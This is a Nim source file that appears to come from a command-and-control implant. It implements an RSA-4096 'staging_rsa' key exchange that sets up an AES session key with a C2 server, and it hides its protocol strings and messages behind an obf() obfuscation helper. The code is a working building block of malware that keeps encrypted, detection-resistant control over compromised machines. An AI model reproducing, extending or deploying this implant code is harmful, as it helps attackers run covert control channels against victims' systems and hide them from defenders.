## Shared RSA key exchange implementation for all C2 profiles
import json, base64, strutils, random
import debug
import rsa
import strenc

type
  KeyExchangeResult* = object
    success*: bool
    sessionKey*: seq[byte]
    error*: string

proc performRsaKeyExchange*(config: Config, uuid: string, sendProc: proc(data: string): string): KeyExchangeResult =
  ## Perform RSA key exchange to establish AES session key
  ## Generic implementation that works with any C2 profile
  ## 
  ## Parameters:
  ##   - config: Agent configuration
  ##   - uuid: Current callback UUID (for staging_rsa message)
  ##   - sendProc: Profile-specific send function that takes encrypted message and returns response
  ##
  ## Returns:
  ##   KeyExchangeResult with success status and session key (if successful)
  
  result = KeyExchangeResult(success: false, sessionKey: @[], error: "")
  
  # If no encrypted exchange needed, skip
  if not config.encryptedExchange:
    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    result.success = true
    return
  
  # Check if RSA is available (requires OpenSSL)
  if not isRsaAvailable():
    debug "[DEBUG] RSA key exchange not available: OpenSSL not found"
    debug "[DEBUG] Use AESPSK (pre-shared key) for encryption instead"
    result.success = true  # Don't fail, just skip key exchange
    return
  
  debug "[DEBUG] === PERFORMING RSA KEY EXCHANGE ==="
  
  try:
    # Generate RSA 4096-bit key pair
    debug "[DEBUG] Generating RSA 4096-bit key pair..."
    
    var rsaKey = generateRsaKeyPair(4096)
    
    if not rsaKey.available:
      result.error = "RSA key generation failed"
      debug "[DEBUG] ", result.error
      return
    
    debug "[DEBUG] RSA key generated, public key length: ", rsaKey.publicKeyPem.len, " bytes"
    
    # Generate random 20-character session ID
    randomize()
    var sessionId = newString(20)
    for i in 0..19:
      sessionId[i] = char(rand(25) + ord('a'))  # Random lowercase letters
    
    debug "[DEBUG] Session ID: ", sessionId
    
    # Build staging_rsa message (JSON format matching oopsie)
    let stagingRsa = %*{
      obf("action"): obf("staging_rsa"),
      obf("session_id"): sessionId,
      obf("pub_key"): rsaKey.publicKeyPem
    }
    
    let stagingStr = $stagingRsa
    
    debug "[DEBUG] Staging RSA request:"
    debug stagingStr
    debug "[DEBUG] Sending staging_rsa (encrypted with PSK)..."
    
    # Send staging_rsa message using profile's send function (encrypted with PSK)
    let response = sendProc(stagingStr)
    
    if response.len == 0:
      result.error = "Empty response from server"
      debug "[DEBUG] Key exchange failed: ", result.error
      return
    
    debug "[DEBUG] Got staging_rsa response (", response.len, " bytes)"
    
    # Parse response (should be Base64-encoded encrypted session key)
    try:
      let responseJson = parseJson(response)
      
      if not responseJson.hasKey(obf("session_key")):
        result.error = obf("Response missing 'session_key' field")
        debug "[DEBUG] ", result.error
        debug "[DEBUG] Response: ", response
        return
      
      let encryptedKeyB64 = responseJson[obf("session_key")].getStr()
      
      debug "[DEBUG] Encrypted session key (Base64): ", encryptedKeyB64[0..min(100, encryptedKeyB64.len-1)]
      
      # Decode from Base64
      let encryptedKey = decode(encryptedKeyB64)
      
      debug "[DEBUG] Encrypted session key length: ", encryptedKey.len, " bytes"
      
      # Decrypt with RSA private key
      debug "[DEBUG] Decrypting session key with RSA private key..."
      
      let decryptedKey = rsaDecryptPrivate(rsaKey, cast[seq[byte]](encryptedKey))
      
      if decryptedKey.len == 0:
        result.error = obf("Failed to decrypt session key")
        debug "[DEBUG] ", result.error
        return
      
      debug "[DEBUG] Decrypted session key length: ", decryptedKey.len, " bytes"
      debug "[DEBUG] Session key (Base64): ", encode(decryptedKey)
      
      # Success!
      result.success = true
      result.sessionKey = decryptedKey
      
      debug "[DEBUG] === RSA KEY EXCHANGE COMPLETE ==="
      debug "[DEBUG] Session key established, will be used for all future communications"
      
    except JsonParsingError:
      result.error = "Invalid JSON response: " & getCurrentExceptionMsg()
      debug "[DEBUG] ", result.error
      debug "[DEBUG] Response: ", response
      return
    
  except Exception as e:
    result.error = "Key exchange exception: " & e.msg
    debug "[DEBUG] ", result.error
    return
